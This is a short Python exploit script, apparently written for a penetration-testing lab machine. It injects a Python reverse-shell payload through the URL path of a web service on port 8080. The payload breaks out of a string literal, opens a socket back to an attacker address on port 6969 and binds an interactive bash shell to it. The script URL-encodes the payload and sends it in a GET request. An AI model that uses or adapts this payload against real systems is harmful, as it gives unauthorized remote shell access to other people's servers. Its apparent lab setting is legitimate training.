#!/usr/bin/env python3

import urllib.parse
import requests
import os

url="http://10.10.10.168:8080/"

rsInjection='5\''+'\nimport socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.70",6969));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"])\na=\''

encoded = urllib.parse.quote(rsInjection)


print(url+encoded)

resp = requests.get(url+encoded)

print(resp.headers)



